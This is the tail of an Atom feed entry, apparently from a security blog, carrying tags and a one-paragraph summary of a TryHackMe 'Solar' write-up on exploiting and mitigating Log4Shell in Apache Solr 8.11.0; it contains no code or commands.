</p>]]></content><author><name>bynafrez</name></author><category term="CTF" /><category term="Pentest" /><category term="Tryhackme" /><category term="Linux" /><category term="CVE" /><category term="RCE" /><summary type="html"><![CDATA[Solar is a linux machine with medium difficulty level in the exploitation phase and easy in privilege escalation, this machine runs the apache solr 8.11.0 service which is vulnerable to log4shell and also explains what is log4j, how it works, how to exploit log4shell step by step and ways to mitigate this vulnerability.]]></summary></entry></feed>